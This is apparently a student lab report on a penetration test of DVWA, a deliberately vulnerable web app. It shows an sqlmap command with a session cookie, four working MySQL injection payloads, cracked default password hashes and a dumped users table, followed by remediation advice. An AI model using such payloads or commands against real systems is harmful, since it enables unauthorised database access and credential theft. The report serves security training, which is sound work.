# Capstone Project – Web Application VAPT (DVWA)

## Objective
To perform a complete web application vulnerability assessment and penetration
test against a deliberately vulnerable application in a controlled lab
environment.

## Target Environment
- Application: Damn Vulnerable Web Application (DVWA)
- Security Level: Low
- Web Server: Apache 2.4.7
- Backend DBMS: MySQL
- OS: Linux Ubuntu

## Vulnerability Identified
The application was found vulnerable to SQL Injection due to improper input
validation and lack of parameterized queries on the `id` parameter.

## Exploitation
The SQL Injection vulnerability was exploited using `sqlmap` by replaying an
authenticated session cookie. Multiple injection techniques were identified,
including boolean-based, error-based, time-based, and UNION-based SQL injection.

## Impact
Successful exploitation allowed enumeration of databases and extraction of
sensitive user information from the `users` table, including usernames and
password hashes, demonstrating a high risk of data breach.

## Evidence
```
 sqlmap -u "http://10.49.143.189/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=5u9v55ie912m05ctdksqf596b6" \
-D dvwa -T users --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.12#stable}                                                                                                                                                                                                   
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:31:34 /2026-01-05/

[07:31:34] [INFO] resuming back-end DBMS 'mysql' 
[07:31:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 6997=6997#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 2174 FROM(SELECT COUNT(*),CONCAT(0x7170627a71,(SELECT (ELT(2174=2174,1))),0x716a767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TgsJ&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3295 FROM (SELECT(SLEEP(5)))Tssx)-- xZdl&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7170627a71,0x42615a4568506b775a6c4d416753524b4a5873626c6c587072597261684f795054716c656d4b5848,0x716a767171),NULL#&Submit=Submit
---
[07:31:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0

[07:32:22] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[07:32:22] [INFO] starting 4 processes 
[07:32:23] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                                                                                                    
[07:32:23] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                                                                                                   
[07:32:24] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                                                                                                   
[07:32:25] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                                                                                                  
Database: dvwa                                                                                                                                                                                                                             
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2018-10-03 22:09:36 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2018-10-03 22:09:36 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2018-10-03 22:09:36 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2018-10-03 22:09:36 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2018-10-03 22:09:36 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[07:32:28] [INFO] table 'dvwa.users' dumped to CSV file '/home/joe/.local/share/sqlmap/output/10.49.143.189/dump/dvwa/users.csv'
[07:32:28] [INFO] fetched data logged to text files under '/home/joe/.local/share/sqlmap/output/10.49.143.189'

```

## Remediation
- Use prepared statements (parameterized queries)
- Validate and sanitize all user input
- Implement least-privilege database access
- Avoid exposing detailed database errors
